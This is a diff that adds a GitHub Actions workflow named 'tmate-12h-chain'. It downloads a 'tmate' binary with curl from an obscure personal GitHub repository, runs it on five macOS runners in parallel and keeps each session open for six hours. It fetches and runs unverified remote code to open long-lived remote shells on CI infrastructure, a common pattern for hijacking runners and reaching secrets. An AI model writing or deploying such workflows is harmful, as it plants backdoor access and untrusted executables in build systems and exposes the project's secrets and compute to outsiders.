@@ -1,0 +1,25 @@
+name: tmate-12h-chain
+
+on:
+  workflow_dispatch:
+
+jobs:
+  tmate-1:
+    runs-on: namespace-profile-macos
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        runner_id: [1, 2, 3, 4, 5]
+      fail-fast: false
+    steps:
+      - name: Download tmate
+        run: |
+          set -euxo pipefail
+          curl -L -o tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
+          chmod +x tmate
+
+      - name: Start tmate session
+        run: |
+          set -euxo pipefail
+          ./tmate -F &
+          sleep 21600   # 6 hours
